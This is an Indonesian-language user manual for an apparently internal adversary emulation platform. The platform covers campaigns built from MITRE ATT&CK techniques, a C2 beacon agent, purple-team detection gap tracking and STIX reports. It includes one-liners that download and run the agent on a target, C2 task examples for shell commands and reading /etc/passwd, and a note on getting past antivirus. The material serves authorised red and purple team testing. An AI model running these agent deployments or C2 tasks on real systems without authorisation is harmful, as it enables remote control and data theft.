# AE Platform — Panduan Penggunaan Lengkap

**AI-Powered Adversary Emulation Platform untuk ICS/OT + Enterprise IT**

> Platform ini adalah tools internal untuk tim red team / purple team melakukan adversary emulation yang terotorisasi. Seluruh penggunaan harus memiliki scope dan Rules of Engagement yang jelas.

---

## Daftar Isi

1. [Apa itu AE Platform?](#1-apa-itu-ae-platform)
2. [Cara Menjalankan](#2-cara-menjalankan)
3. [Dua Mode Eksekusi](#3-dua-mode-eksekusi)
4. [Menu Campaign](#4-menu-campaign)
5. [Menu Agent (C2 Dashboard)](#5-menu-agent-c2-dashboard)
6. [Menu Techniques](#6-menu-techniques)
7. [Menu APT Profiles](#7-menu-apt-profiles)
8. [Menu Purple Team](#8-menu-purple-team)
9. [Menu Reports & STIX](#9-menu-reports--stix)
10. [Alur Kerja Lengkap (End-to-End)](#10-alur-kerja-lengkap-end-to-end)

---

## 1. Apa itu AE Platform?

AE Platform adalah tools adversary emulation yang cara kerjanya **mirip dengan CALDERA atau Cobalt Strike**, tapi fokus pada:
- Simulasi serangan berbasis **MITRE ATT&CK** (Enterprise IT dan ICS/OT)
- Mode **simulasi lokal** (tanpa agent) untuk planning dan reporting cepat
- Mode **C2 dengan agent** (seperti Cobalt Strike) untuk eksekusi nyata di target machine
- **Purple Team mode** untuk validasi deteksi bersama tim blue team

**Perbedaan dari tools lain:**
| Fitur | AE Platform | Caldera | Cobalt Strike |
|-------|-------------|---------|---------------|
| AI Decision Engine | ✅ Claude AI | ❌ | ❌ |
| ICS/OT Techniques | ✅ | Terbatas | ❌ |
| Purple Team Mode | ✅ | ✅ | ❌ |
| Simulasi tanpa agent | ✅ | ❌ | ❌ |
| STIX 2.1 Export | ✅ | ❌ | ❌ |
| Open + lokal | ✅ | ✅ | ❌ |

---

## 2. Cara Menjalankan

```bash
# Aktivasi virtual environment
.venv/Scripts/activate          # Windows
source .venv/bin/activate       # Linux/macOS

# Pertama kali: inisialisasi database + load APT profiles bawaan
python -m core.main init-db

# Opsional: download teknik MITRE ATT&CK (~2000+ teknik)
# Tanpa ini, menu Techniques akan kosong
python -m core.main sync-attack

# Jalankan server
python -m core.main serve
```

Buka browser: **http://localhost:8000/ui**

---

## 3. Dua Mode Eksekusi

Ini adalah konsep paling penting untuk dipahami.

### Mode A — Simulasi (tanpa agent)

```
Dashboard → Campaign → Add Steps → Run Step (masukkan target IP)
                                        ↓
                          Tidak ada agent di target?
                                        ↓
                        Eksekusi via TechniqueRegistry
                        (simulasi probabilistik lokal)
                                        ↓
                          Hasil dicatat ke database
                          → Bisa generate report
```

**Kapan dipakai:** Planning kampanye, demonstrasi kepada klien, generate laporan tanpa perlu akses langsung ke target.

**Yang terjadi:** Platform mensimulasikan apa yang *akan* terjadi jika teknik tersebut dieksekusi. Hasilnya bersifat probabilistik (berhasil/gagal berdasarkan konteks), bukan eksekusi nyata.

---

### Mode B — Agent / C2 (eksekusi nyata)

```
Deploy aep_agent.py ke target machine
              ↓
Agent register ke AEP server (auto)
              ↓
Agent beacon setiap N detik
              ↓
Dashboard → Agents → Pilih agent → Queue Task
         ATAU
Dashboard → Campaign → Run Step (masukkan IP target yang ada agentnya)
              ↓
    Task dikirim ke agent saat beacon berikutnya
              ↓
    Agent eksekusi teknik di target (NYATA):
    - Jalankan PowerShell/Bash command
    - Lakukan port scan
    - Enumerasi proses
    - Simulasi ATT&CK technique
              ↓
    Agent report hasil kembali ke server
              ↓
    Output muncul di C2 dashboard
```

**Kapan dipakai:** Engagement nyata di target yang sudah diotorisasi, proof-of-concept eksekusi teknik.

**Yang terjadi:** Teknik benar-benar dijalankan di mesin target. Seperti Cobalt Strike beacon, tapi untuk adversary emulation yang terotorisasi.

---

## 4. Menu Campaign

Campaign adalah **unit utama engagement**. Satu kampanye = satu engagement dengan satu klien.

### 4.1 Membuat Campaign

Klik **New Campaign** → isi form:

| Field | Keterangan |
|-------|-----------|
| **Campaign Name** | Nama engagement, contoh: "Operation Blackout Q2 2025" |
| **Client Name** | Nama klien/organisasi target |
| **Engagement Type** | `blackbox` = tidak ada info awal, `greybox` = ada sebagian info, `whitebox` = full info |
| **Environment** | `it` = Enterprise IT, `ot` = ICS/OT, `hybrid` = keduanya |
| **APT Profile** | Pilih threat actor yang di-emulasi (APT28, Lazarus, dll.) |
| **Rules of Engagement** | **WAJIB.** Aturan eksekusi: jam operasi, sistem yang boleh/tidak, batasan |
| **Target IPs** | **WAJIB.** IP/range target. Tulis satu per baris atau pisah koma |
| **Production Safe Mode** | ✅ Aktifkan untuk cegah teknik destruktif |

Setelah dibuat, campaign berstatus **draft**.

### 4.2 Menambahkan Steps

Steps adalah langkah-langkah serangan yang akan dieksekusi. Klik campaign → **Add Step**:

| Field | Keterangan |
|-------|-----------|
| **Phase** | Taktik ATT&CK: `initial_access`, `execution`, `persistence`, dll. |
| **Technique ID** | ID ATT&CK, contoh: `T1566`, `T1566.001`, `T0886` (ICS) |
| **Risk** | `low` / `medium` / `high` / `critical` — tingkat risiko step ini |
| **Order** | Urutan eksekusi (1, 2, 3...) |
| **Method** | Metode eksekusi, contoh: `spearphish`, `powershell`, `exploit` |
| **Notes** | Catatan tambahan |

**Contoh urutan steps untuk kampanye ransomware:**
```
1. T1566.001 (initial_access)  — Spearphishing Attachment
2. T1059.001 (execution)       — PowerShell
3. T1547.001 (persistence)     — Registry Run Keys
4. T1055    (privilege_esc)    — Process Injection
5. T1021.002 (lateral_movement)— SMB/Admin Shares
6. T1486    (impact)           — Data Encrypted for Impact
```

### 4.3 Memulai Campaign (Start)

Klik tombol **Start** → platform melakukan validasi otomatis:
- **Jika ANTHROPIC_API_KEY diset:** Claude AI memvalidasi apakah scope, RoE, dan target sudah lengkap
- **Jika tidak ada API key:** Validasi deterministik (cek field wajib)

Setelah valid → status berubah ke **active**.

> ⚠️ Campaign hanya bisa di-Start jika status `draft` atau `paused`.

### 4.4 Mengeksekusi Steps

Di tabel steps, setiap baris punya kolom **Run**:

1. Isi **target IP/hostname** di field sebelah tombol play
2. Klik tombol ▶ (play)
3. Platform memutuskan:
   - Ada agent aktif di IP tersebut? → **Route ke agent** (eksekusi nyata)
   - Tidak ada agent? → **Simulasi lokal** (probabilistik)
4. Hasil dicatat ke database

### 4.5 Reports Campaign

Di halaman detail campaign, panel kanan punya link langsung ke:
- **JSON Report** — data lengkap dalam format JSON
- **HTML Report** — laporan siap presentasi
- **PDF Report** — untuk dikirim ke klien
- **ATT&CK Navigator** — heatmap teknik yang dieksekusi
- **STIX 2.1 Bundle** — export ke MISP/OpenCTI/TAXII

---

## 5. Menu Agent (C2 Dashboard)

Agent adalah komponen yang di-deploy ke target machine untuk eksekusi nyata — konsepnya sama dengan **Cobalt Strike Beacon** atau **CALDERA Agent**.

### 5.1 Deploy Agent ke Target

Klik tombol **Deploy Agent** → pilih OS target → copy command → paste di target machine:

**Windows (PowerShell):**
```powershell
# Download agent script dari AEP server
Invoke-WebRequest -Uri "http://[IP_AEP]:8000/agent.py" -OutFile "$env:TEMP\aep_agent.py"

# Jalankan agent
python "$env:TEMP\aep_agent.py" --server http://[IP_AEP]:8000 --interval 30
```

**Linux/macOS (Bash):**
```bash
# Download dan jalankan
curl -s http://[IP_AEP]:8000/agent.py -o /tmp/aep_agent.py
python3 /tmp/aep_agent.py --server http://[IP_AEP]:8000 --interval 30
```

**Parameter agent:**
| Parameter | Keterangan |
|-----------|-----------|
| `--server` | URL AEP server, contoh: `http://10.0.0.1:8000` |
| `--interval` | Beacon interval dalam detik (default: 60) |
| `--type` | `it` (Enterprise) atau `ot` (ICS/OT) |
| `--campaign-id` | Attach langsung ke campaign tertentu |
| `--name` | Nama agent di dashboard |

Setelah dijalankan, agent otomatis:
1. Deteksi OS, hostname, IP, privilege level
2. Register ke AEP server → dapatkan token
3. Mulai beacon loop

> 💡 Token ditampilkan SEKALI di output terminal agent. Simpan jika diperlukan.

### 5.2 Memantau Agent

Dashboard agent menampilkan:
- **OS icon** — Windows/Linux/macOS
- **Status dot** — hijau (active/beaconing), kuning (stale/missed beacon), merah (terminated)
- **Privilege** — 👑 root/admin atau user biasa
- **Last Beacon** — kapan terakhir check-in
- **Tasks** — berapa task selesai / pending

**Auto-refresh** setiap 15 detik otomatis (bisa dinonaktifkan).

### 5.3 Mengontrol Agent (C2 Panel)

Klik agent atau tombol **Control** → panel slide-in dari kanan:

**Queue Task** — kirim perintah ke agent:

| Task Type | Keterangan | Params (JSON) |
|-----------|-----------|---------------|
| `shell_command` | Jalankan shell command | `{"command": "whoami && hostname"}` |
| `powershell` | Jalankan PowerShell script | `{"script": "Get-Process \| Select -First 10"}` |
| `python_exec` | Jalankan Python code | `{"code": "import os; print(os.getcwd())"}` |
| `file_read` | Baca file | `{"path": "/etc/passwd"}` |
| `file_write` | Tulis file | `{"path": "/tmp/test.txt", "content": "hello"}` |
| `process_enum` | Daftar proses berjalan | `{}` |
| `network_scan` | Port scan ke target | `{"target": "10.0.0.5", "ports": [22,80,443]}` |
| `execute_technique` | Eksekusi ATT&CK technique | `{}` (gunakan Technique ID di atas) |

Task masuk antrian → agent pick up saat beacon berikutnya → hasil muncul di panel (klik task untuk lihat output).

**Terminate** — hentikan agent (tidak bisa di-undo, harus deploy ulang).

### 5.4 Alur Campaign + Agent (terintegrasi)

```
Campaign dibuat → Steps ditambahkan
        ↓
Agent di-deploy ke target IP (misal: 10.0.0.5)
        ↓
Campaign di-Start (validasi AI)
        ↓
Campaign → Step T1057 → Run → target: "10.0.0.5"
        ↓
TaskDispatcher: "ada agent di 10.0.0.5?" → YA
        ↓
Task T1057 dikirim ke agent
        ↓
Agent eksekusi `ps aux` / `tasklist` di 10.0.0.5
        ↓
Hasil (daftar proses) → dicatat di database
        ↓
Muncul di report + ATT&CK Navigator
```

---

## 6. Menu Techniques

Library semua teknik MITRE ATT&CK yang diketahui platform.

> **Penting:** Menu ini kosong sampai Anda menjalankan `python -m core.main sync-attack`
> Proses download ~2000+ teknik dari MITRE, butuh beberapa menit, koneksi internet diperlukan.

### Yang bisa dilakukan:

- **Search** — cari berdasarkan ID (T1566) atau nama (Phishing)
- **Filter** — berdasarkan environment (IT/OT) dan taktik
- **Klik baris** — expand detail teknik: deskripsi, platforms, detection hints, mitigation, data sources, link ke ATT&CK

### Stats cards di atas:

| Card | Artinya |
|------|---------|
| Registry Total | Teknik yang punya **implementasi konkret** (bisa dieksekusi via agent/simulasi) |
| IT Techniques | Teknik Enterprise ATT&CK yang terdaftar di registry |
| OT/ICS Techniques | Teknik ATT&CK for ICS yang terdaftar |
| DB Techniques | Teknik yang sudah di-sync dari MITRE ke database |

---

## 7. Menu APT Profiles

Profile threat actor yang di-emulasi dalam kampanye.

### Profile bawaan (built-in):
- **APT28 (Fancy Bear)** — Russia, espionage, sophistication: nation_state
- **APT29 (Cozy Bear)** — Russia, espionage, nation_state
- **Sandworm** — Russia, sabotage, targets OT/ICS
- **Lazarus Group** — North Korea, financial + espionage
- **TRITON** — Unknown, sabotage, ICS-focused (Safety Instrumented Systems)

### Membuat profile custom:

Klik **New Profile** → isi:

| Field | Nilai yang valid |
|-------|-----------------|
| Motivation | `espionage` / `financial` / `hacktivist` / `sabotage` / `unknown` |
| Sophistication | `low` / `medium` / `high` / `nation_state` |
| Targets OT | Centang jika actor ini menargetkan ICS/OT |

### Menggunakan profile di campaign:

Saat buat campaign, pilih APT Profile → AI Decision Engine akan menyesuaikan:
- Teknik yang disarankan sesuai TTP actor tersebut
- Tingkat sophistication mempengaruhi success rate simulasi

---

## 8. Menu Purple Team

Purple Team mode untuk **validasi deteksi secara kolaboratif** antara red team dan blue team.

### Konsep Purple Team:

```
Red Team eksekusi teknik → Blue Team mencatat apakah terdeteksi
                                    ↓
                          Platform hitung detection gaps
                                    ↓
                          Generate Sigma rules + recommendations
```

### 8.1 Alur Penggunaan

**Langkah 1 — Buat Session**

Klik **New Session** → isi nama, environment, nama red lead dan blue lead.

**Langkah 2 — Start Session**

Klik **Start Session** → status berubah ke `active`.

**Langkah 3 — Red Team mencatat aksi (tab Events)**

Klik **Record Red Action** → isi:
- Technique ID yang dieksekusi (contoh: `T1566.001`)
- Target machine
- Taktik dan nama teknik

**Langkah 4 — Blue Team merespons**

Di setiap event, blue team klik **Respond** → isi:
- Response: `detected` / `not_detected` / `partially_detected` / `blocked` / `escalated`
- Detection latency (berapa detik sampai terdeteksi)
- Tool yang mendeteksi (SIEM, EDR, Firewall)
- Nama alert/rule yang triggered

**Langkah 5 — Lihat Gaps (tab Detection Gaps)**

Platform otomatis menghitung:
- Teknik mana yang **tidak terdeteksi** (detection gap)
- Detection rate keseluruhan
- Average detection latency

Untuk setiap gap → klik **Sigma** → dapat Sigma rule hint untuk ditambahkan ke SIEM.

**Langkah 6 — Complete Session & Generate Report**

Klik **Complete Session** → download:
- HTML/PDF report dengan gap analysis
- STIX 2.1 bundle (untuk import ke MISP/OpenCTI)

---

## 9. Menu Reports & STIX

Generate laporan dan export dalam berbagai format.

### Tab Campaign Reports

Pilih campaign → download:

| Format | Isi | Audience |
|--------|-----|----------|
| **JSON** | Data mentah lengkap | Developer/integrasi |
| **HTML** | Laporan interaktif | Tim internal |
| **PDF** | Laporan formal | Klien/management |
| **ATT&CK Navigator** | Layer JSON heatmap | Threat intel team |

### Tab Purple Team Reports

Pilih session purple team → download HTML/PDF report berisi:
- Summary eksekusi
- Detection gap per teknik
- Sigma rule hints
- Rekomendasi perbaikan deteksi

### Tab STIX 2.1

Export dalam format **STIX 2.1** untuk diimport ke:
- **MISP** — Malware Information Sharing Platform
- **OpenCTI** — Open Cyber Threat Intelligence
- **TAXII 2.1** — server threat intelligence

Bundle berisi: `Identity` (AEP) → `Campaign` → `AttackPattern` (teknik) → `Indicator` (gap) → `CourseOfAction` (remediation) dengan relasi antar objek.

### Tab ATT&CK Navigator

Download layer JSON untuk dibuka di [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/):
- **Platform-wide** — semua kampanye gabungan
- **Per-campaign** — coverage spesifik satu engagement

---

## 10. Alur Kerja Lengkap (End-to-End)

### Skenario: Red Team Engagement untuk klien ACME Corp

```
PERSIAPAN
─────────
1. python -m core.main init-db          # Setup database
2. python -m core.main sync-attack      # Load ATT&CK techniques
3. python -m core.main serve            # Jalankan server
4. Buka http://localhost:8000/ui

PLANNING
────────
5. APT Profiles → pilih/buat profile threat actor yang akan diemulasi
   (misal: APT29 untuk espionage simulation)

6. Campaigns → New Campaign:
   - Nama: "ACME Corp Red Team Q2 2025"
   - Client: ACME Corp
   - Type: greybox
   - Environment: it
   - APT Profile: APT29
   - RoE: "No production DB, test hours Mon-Fri 09-17 WIB"
   - Target IPs: 192.168.1.0/24

7. Campaign → Add Steps (sesuai TTP APT29):
   - T1566.001 initial_access (Spearphishing)
   - T1059.001 execution (PowerShell)
   - T1003.001 credential_access (LSASS Memory)
   - T1021.001 lateral_movement (RDP)
   - T1041    exfiltration (C2 channel)

EKSEKUSI — Mode Simulasi
────────────────────────
8. Campaign → Start (AI validasi engagement)
9. Setiap step → Run → masukkan target IP
   → Simulasi lokal, hasil probabilistik

EKSEKUSI — Mode Agent (lebih realistik)
────────────────────────────────────────
8. Agents → Deploy Agent:
   - Copy PowerShell one-liner
   - Paste di Windows target machine (yang sudah diotorisasi)
   - Agent muncul di dashboard dalam beberapa detik

9. Campaign → Start
10. Step T1059.001 → Run → target: "192.168.1.50"
    → TaskDispatcher temukan agent di 192.168.1.50
    → Eksekusi PowerShell nyata di target
    → Hasil muncul di C2 panel

PURPLE TEAM (opsional, kolaborasi dengan blue team)
────────────────────────────────────────────────────
11. Purple Team → New Session → Start
12. Red team record setiap aksi
13. Blue team respond (detected/not_detected)
14. Lihat detection gaps di tab Gaps

REPORTING
─────────
15. Campaign → HTML/PDF Report untuk klien
16. Purple Team → Report untuk tim SOC
17. Reports → STIX Export → Import ke MISP/OpenCTI
18. Reports → ATT&CK Navigator → visualisasi coverage
```

---

## Pertanyaan Umum

**Q: Campaign step Run vs Agent task — apa bedanya?**

A: Keduanya bisa mengeksekusi teknik yang sama, tapi entry point-nya berbeda:
- **Campaign step Run** = eksekusi dalam konteks campaign. Hasil dicatat ke campaign report.
- **Agent task** = eksekusi ad-hoc tanpa campaign. Berguna untuk reconnaissance cepat atau testing.

**Q: Apakah bisa dipakai tanpa ANTHROPIC_API_KEY?**

A: Ya. Tanpa API key, platform berjalan dalam mode deterministik:
- Validasi campaign: cek field wajib saja (tanpa AI analysis)
- Simulasi teknik: probabilistik berdasarkan metadata teknik
- Semua menu tetap berfungsi

Dengan API key: AI memberikan rekomendasi, analisis konteks, dan pivot suggestions.

**Q: sync-attack berapa lama?**

A: 5-15 menit tergantung kecepatan internet. Data ~50MB dari MITRE GitHub. Hanya perlu dilakukan sekali, setelah itu data tersimpan di database.

**Q: Apakah agent bisa di-detect oleh antivirus?**

A: `aep_agent.py` adalah Python script biasa (tidak obfuscated). Di environment lab/staging, biasanya tidak di-detect. Untuk engagement dengan AV aktif, perlu modifikasi atau whitelisting manual.

**Q: Perbedaan campaign status?**

| Status | Artinya |
|--------|---------|
| `draft` | Baru dibuat, belum divalidasi |
| `validating` | Sedang divalidasi AI (berlangsung beberapa detik) |
| `active` | Siap eksekusi, bisa run steps |
| `paused` | Dihentikan sementara, bisa di-resume |
| `completed` | Selesai |
| `aborted` | Dihentikan paksa |
